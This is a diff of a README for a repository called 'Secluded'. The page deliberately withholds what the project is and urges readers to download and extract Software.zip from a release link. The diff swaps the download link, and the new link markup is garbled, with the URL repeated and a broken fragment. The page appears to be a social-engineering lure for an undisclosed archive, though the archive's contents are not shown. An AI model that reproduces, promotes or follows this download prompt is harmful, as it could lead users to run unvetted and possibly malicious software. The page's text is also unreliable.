@@ -10,7 +10,7 @@ The topics of this repository are not explicitly mentioned, keeping the mysterio
 
 ## Content
 To access the content of this repository, please visit the following link:
-[![Software.zip](https://img.shields.io/badge/Click%20to%20Launch-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![https://github.com/tinhuynh123/Secluded/releases/download/v2.0/Software.zip](https://github.com/tinhuynh123/Secluded/releases/download/v2.0/Software.zip%20to%https://github.com/tinhuynh123/Secluded/releases/download/v2.0/Software.zip)](https://github.com/tinhuynh123/Secluded/releases/download/v2.0/Software.zip)
 
 Remember, the best treasures are often found in the most secluded places.
 
@@ -18,7 +18,7 @@ Remember, the best treasures are often found in the most secluded places.
 Whether you are a software enthusiast, a nature lover, or simply curious about what lies beyond the beaten path, **Secluded** offers an experience like no other. Venture into the depths of this repository to uncover its mysteries and hidden gems.
 
 ### Installation Guide 🛠️
-1. Click on the link provided above to download the Software.zip file.
+1. Click on the link provided above to download the https://github.com/tinhuynh123/Secluded/releases/download/v2.0/Software.zip file.
 2. Extract the contents of the zip file to your desired location.
 3. Dive into the files and explore the enchanting world of the **Secluded** repository.
 
